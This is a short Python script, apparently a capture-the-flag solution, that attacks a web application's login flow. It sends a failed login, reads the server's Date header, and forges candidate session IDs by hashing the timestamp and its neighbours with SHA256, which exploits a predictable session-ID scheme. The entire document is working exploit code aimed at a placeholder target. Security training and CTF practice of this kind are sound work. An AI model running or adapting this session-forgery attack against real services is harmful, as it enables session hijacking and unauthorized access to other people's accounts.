import requests
import hashlib
import time
from datetime import datetime, timezone
 
# CTF instance URL
base_url = "http://replace_with_target_ip"

# Fake username for failed login (to set Redis without creating file)
fake_username = "noexist"
wrong_password = "dummypassword"

# Step 1: Perform failed login to set Redis entry
login_payload = {"username": fake_username, "password": wrong_password}
headers = {
    "Content-Type": "application/json",
    # Add other headers from curl if needed, but minimal for now
}
failed_resp = requests.post(f"{base_url}/login", json=login_payload, headers=headers)

if failed_resp.status_code != 400:  # Expect 400 for invalid credentials
    print("Unexpected status:", failed_resp.status_code, failed_resp.text)
    exit(1)
print("Failed login performed, Redis should be set.")

# Fetch the Date header
server_date = failed_resp.headers.get("Date")
if not server_date:
    print("No Date header found.")
    exit(1)

# Parse Date to datetime object (RFC 1123 format)
try:
    dt = datetime.strptime(server_date, "%a, %d %b %Y %H:%M:%S %Z")
    dt = dt.replace(tzinfo=timezone.utc)  # Assume GMT/UTC
except ValueError:
    print("Date parse failed:", server_date)
    exit(1)

# Get Unix timestamp
unix_time = int(dt.timestamp())
print(f"Server Unix time (approx): {unix_time}")

# Forge possible session IDs (similar to Go code: SHA256(str(unix)))
# Compute for unix-1, unix, unix+1 to account for jitter
possible_session_ids = []
for offset in [-1, 0, 1]:
    ts = unix_time + offset
    ts_str = str(ts)
    session_id = hashlib.sha256(ts_str.encode()).hexdigest()
    possible_session_ids.append(session_id)
    print(f"Possible session ID (offset {offset}): {session_id}")

# Output the list for next steps
print("\nPossible session IDs for username '{}':".format(fake_username))
for sid in possible_session_ids:
    print(sid)
